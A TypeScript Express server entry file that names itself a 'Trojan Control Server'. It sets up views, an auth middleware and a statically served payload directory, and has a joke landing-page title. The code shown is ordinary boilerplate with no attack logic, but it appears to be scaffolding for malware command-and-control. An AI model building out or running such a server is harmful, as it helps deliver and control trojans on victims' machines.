import express, { Application, Request, Response } from "express";
import handlebars from "express-handlebars";
import cookieParser from "cookie-parser";
import * as bodyParser from "body-parser";
import { config } from "./config";
import { DEFAULT_ROUTE, LOGIN_ROUTE, REGISTER_ROUTE } from "./routes";
import { authTokenMiddleware } from "./auth";
import addRoutes from "./add_routes";
import { initDatabase } from "./services/database";

export const app: Application = express();

export const PAYLOAD_DIR = "files/";
const VIEWS_DIR = `${__dirname}/views`;

app.set("view engine", "handlebars");
app.set("views", VIEWS_DIR);
app.engine(
	"handlebars",
	handlebars({
		defaultLayout: "main"
	})
);

app.use(cookieParser());
app.use(bodyParser.json({ limit: "10mb" }));
app.use(bodyParser.urlencoded({ limit: "10mb", extended: false }));
app.use(authTokenMiddleware);

app.use(express.static(VIEWS_DIR));
app.use(express.static(PAYLOAD_DIR));

app.use(express.json());

app.get(DEFAULT_ROUTE, function (req: Request, res: Response): void {
	console.log(`GET ${DEFAULT_ROUTE}`);
	res.render("landing", {
		title: "obama 69 websit",
		loginRoute: LOGIN_ROUTE,
		registerRoute: REGISTER_ROUTE
	});
});

addRoutes(app);

initDatabase(config.database.dbName);

app.listen(config.port, function () {
	console.log(`Trojan Control Server listening on port ${config.port}`);
});
